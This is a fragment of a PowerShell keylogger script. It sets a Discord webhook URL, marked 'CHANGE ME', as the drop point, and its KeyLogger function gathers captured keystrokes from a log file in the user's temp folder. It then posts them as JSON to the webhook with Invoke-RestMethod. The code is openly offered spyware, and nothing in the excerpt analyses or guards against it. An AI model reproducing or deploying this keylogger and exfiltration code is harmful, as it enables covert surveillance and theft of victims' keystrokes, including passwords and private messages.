...
# webhook, CHANGE ME
$webhook = "https://discord.com/api/webhooks/1076270776862388305/l7O1GpVb5ujJseN88cPwEor3cIa-VgU8pBnKsk-RVQDGuSov1AinpdFgvYt3FWTwvY-f"
...
function KeyLogger($logFile="$env:temp/$env:UserName.log") {
  ...
  $body = [PSCustomObject]@{
    ...
    'content' = $cbt+$logs+$cbt
  }
  # Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body
  Invoke-RestMethod -Uri $webhook -Method POST -Headers $headers -Body ($body | ConvertTo-Json)
